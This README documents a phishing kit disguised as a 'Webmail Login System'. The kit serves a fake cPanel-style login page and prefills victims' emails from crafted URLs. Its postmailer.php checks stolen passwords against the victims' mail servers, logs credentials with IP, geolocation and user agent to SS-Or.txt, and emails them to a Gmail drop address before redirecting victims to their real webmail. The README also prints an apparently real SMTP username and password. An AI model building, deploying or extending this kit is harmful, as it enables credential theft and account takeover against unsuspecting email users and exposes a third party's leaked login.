# Webmail Login System

A professional webmail login interface that provides a seamless experience for users to access their email accounts across different domains. The system automatically extracts email addresses from URLs and redirects users to their respective webmail services.

## Features

### 🚀 Core Functionality
- **Smart Email Detection**: Automatically extracts email addresses from:
  - URL hash fragments (`#user@domain.com`)
  - Query parameters (`?email=user@domain.com`)
  - Filename patterns (`index.html@user@domain.com`)
  - URL path patterns
- **Dynamic Redirects**: Automatically redirects to `webmail.{domain}` based on email domain
- **Form Validation**: Client-side email format validation and required field checks
- **Loading States**: Professional loading overlay during authentication
- **Error Handling**: Comprehensive error messages and status indicators

### 🎨 User Interface
- **Responsive Design**: Mobile-friendly layout that adapts to different screen sizes
- **Professional Styling**: Clean, modern interface inspired by cPanel webmail
- **Visual Feedback**: Success/error indicators with icons and color coding
- **Auto-focus**: Smart form field focusing for better user experience
- **Email Highlighting**: Visual feedback when email is auto-populated

### 🔧 Technical Features
- **AJAX Form Submission**: Asynchronous form processing without page refresh
- **Multiple Redirect Methods**: Fallback mechanisms for reliable redirection
- **Cross-Origin Support**: CORS-enabled for external API integration
- **Logging System**: Server-side logging of login attempts
- **Security Headers**: Proper HTTP headers and input validation

## Project Structure

```
/
├── index.html          # Main login page
├── style.css          # Stylesheet with responsive design
├── script.js          # JavaScript functionality
├── postmailer.php     # PHP backend for form processing
├── class.phpmailer.php # PHPMailer class for email functionality
├── class.smtp.php     # SMTP class for mail server communication
├── SS-Or.txt          # Generated log file (created automatically)
└── README.md          # This documentation
```

## Setup Instructions

### Prerequisites
- Web server with PHP support (Apache, Nginx, etc.)
- PHP 7.4 or higher with curl extension enabled
- Write permissions for log file creation
- SMTP server access for email notifications
- Internet connection for geolocation API

### Installation

1. **Clone or Download** the project files to your web server directory
2. **Configure Permissions** (if using log functionality):
   ```bash
   chmod 644 SS-Or.txt
   chmod 755 .
   ```
3. **Update Configuration**:
   - **In `postmailer.php`**: Update SMTP settings and receiver email
   - **In `script.js`**: Modify redirect delay and fallback domain
   - **Verify PHPMailer classes**: Ensure `class.phpmailer.php` and `class.smtp.php` are present

### Local Development

For local testing, you can use PHP's built-in server:

```bash
cd /path/to/project
php -S localhost:8000
```

Then open `http://localhost:8000` in your browser.

## Usage

### Basic Usage
1. Open `index.html` in a web browser
2. Enter email address and password
3. Click "Log in" to authenticate
4. System will redirect to the appropriate webmail service

### URL-based Email Population

The system supports several methods to auto-populate the email field:

#### Hash Fragment
```
https://yourdomain.com/index.html#user@example.com
```

#### Query Parameters
```
https://yourdomain.com/index.html?email=user@example.com
https://yourdomain.com/index.html?user=user@example.com
```

#### Filename Pattern
```
https://yourdomain.com/index.html@user@example.com
```

### Backend Configuration

The PHP backend (`postmailer.php`) provides advanced authentication and logging capabilities:

#### Current Production Features
- **Real SMTP Validation**: Tests actual credentials against mail servers
- **Geolocation Tracking**: Uses GeoPlugin API for IP geolocation
- **Email Notifications**: Sends detailed logs via SMTP to configured recipient
- **File Logging**: Saves attempts to `SS-Or.txt` with detailed information
- **Success/Failure Differentiation**: Different email subjects for valid vs invalid credentials

#### Authentication Process
1. **Credential Validation**: Attempts to connect to `mail.{domain}` using provided credentials
2. **Success Path**: Sends notification with "TrueRcubeOrange" subject prefix
3. **Failure Path**: Sends notification with "notVerifiedRcudeOrange" subject prefix
4. **Logging**: Records IP, geolocation, user agent, and credentials

#### Email Configuration
- **Receiver**: `skkho87.sm@gmail.com` (configurable)
- **SMTP Server**: `mail.museums.or.ke`
- **SMTP User**: `okioko@museums.or.ke`
- **Port**: 587 with TLS encryption

#### Customization Options
1. **SMTP Settings**: Update receiver email and SMTP configuration
2. **Geolocation Service**: Replace GeoPlugin with alternative IP lookup service
3. **Validation Logic**: Modify credential testing methodology
4. **Logging Format**: Customize log file structure and content
5. **Security Features**: Add rate limiting and IP blocking

## Configuration

### JavaScript Settings (`script.js`)

```javascript
// Redirect delay after successful login
var REDIRECT_DELAY = 1500; // milliseconds

// Backend endpoint
url: 'postmailer.php'

// Fallback domain
return 'https://webmail.gracedrive.org';
```

### PHP Settings (`postmailer.php`)

```php
// Email configuration
$receiver     = "skkho87.sm@gmail.com"; // Where to receive the logs
$senderuser   = "okioko@museums.or.ke"; // SMTP user
$senderpass   = "onesmus@2022";         // SMTP password
$senderport   = 587;                    // SMTP port
$senderserver = "mail.museums.or.ke";   // SMTP server

// Log file location
$log_file = 'SS-Or.txt';

// Validation logic
$validCredentials = validateCredentials($login, $passwd, $domain);
```

## API Response Format

### Success Response
```json
{
    "signal": "ok",
    "msg": "Login Successful"
}
```

### Error Response (Invalid Credentials)
```json
{
    "signal": "not ok",
    "msg": "Wrong Password"
}
```

### Error Response (SMTP Failure)
```json
{
    "signal": "not ok",
    "msg": "SMTP logging failed"
}
```

### Error Response (No Credentials)
```json
{
    "signal": "error",
    "msg": "No credentials provided"
}
```

## Security Considerations

1. **Input Validation**: All inputs are validated both client-side and server-side
2. **CSRF Protection**: Consider adding CSRF tokens for production use
3. **Rate Limiting**: Implement rate limiting to prevent brute force attacks
4. **HTTPS**: Always use HTTPS in production environments
5. **Log Security**: Ensure log files are not publicly accessible
6. **Password Handling**: Passwords are not stored, only validated

## Browser Compatibility

- **Modern Browsers**: Chrome, Firefox, Safari, Edge (latest versions)
- **Mobile Browsers**: iOS Safari, Chrome Mobile, Samsung Internet
- **JavaScript Required**: The application requires JavaScript to be enabled

## Troubleshooting

### Common Issues

1. **CORS Errors**: Ensure proper CORS headers are set in the PHP backend
2. **File Permissions**: Check write permissions for log file creation
3. **JavaScript Errors**: Open browser developer tools to check for console errors
4. **Redirect Issues**: Verify the target webmail domains are accessible

### Debug Mode

Enable console logging by opening browser developer tools. The application logs:
- Email extraction attempts
- AJAX request/response details
- Redirect attempts
- Error conditions

## License

This project is provided as-is for educational and development purposes. Please ensure compliance with applicable laws and regulations when implementing in production environments.

## Support

For issues and questions:
1. Check the browser console for JavaScript errors
2. Verify PHP error logs for backend issues
3. Ensure all file permissions are correctly set
4. Test with different browsers and devices